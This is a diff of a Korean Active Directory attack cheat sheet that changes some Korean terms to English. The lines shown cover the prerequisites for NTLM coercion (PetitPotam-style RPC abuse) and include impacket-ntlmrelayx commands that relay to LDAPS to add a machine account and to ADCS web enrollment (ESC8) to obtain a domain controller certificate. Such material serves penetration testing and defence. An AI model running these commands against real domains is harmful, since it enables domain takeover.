@@ -19,9 +19,9 @@ graph LR
 
 조건:
 
-- 보통 **유효 도메인 자격증명**이 있어야 RPC/MSRPC 코어션을 호출할 수 있음 (PetitPotam 일부 변형은 미인증 가능)
-- 타겟이 **SMB Signing 미강제** (Relay 시) 또는 **MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP 노출**
-- 공격자가 타겟에서 도달 가능한 SMB(445)/HTTP(80) 리스너 보유
+- 보통 **유효 도메인 credential**이 있어야 RPC/MSRPC 코어션을 호출할 수 있음 (PetitPotam 일부 변형은 미인증 가능)
+- target이 **SMB Signing 미강제** (Relay 시) 또는 **MS-EFSR/MS-RPRN/MS-DFSNM/MS-FSRVP 노출**
+- 공격자가 target에서 도달 가능한 SMB(445)/HTTP(80) 리스너 보유
 
 ---
 
@@ -134,7 +134,7 @@ impacket-ntlmrelayx -t ldaps://<dc_ip> --add-computer ATTACKER\$ -smb2support
 ### 3) ADCS HTTP Relay (ESC8) → 도메인 장악
 
 ```bash
-# Web Enrollment 엔드포인트로 relay → DC 인증서 발급
+# Web Enrollment endpoint로 relay → DC 인증서 발급
 impacket-ntlmrelayx -t http://<adcs>/certsrv/certfnsh.asp \
   --adcs --template DomainController -smb2support
 
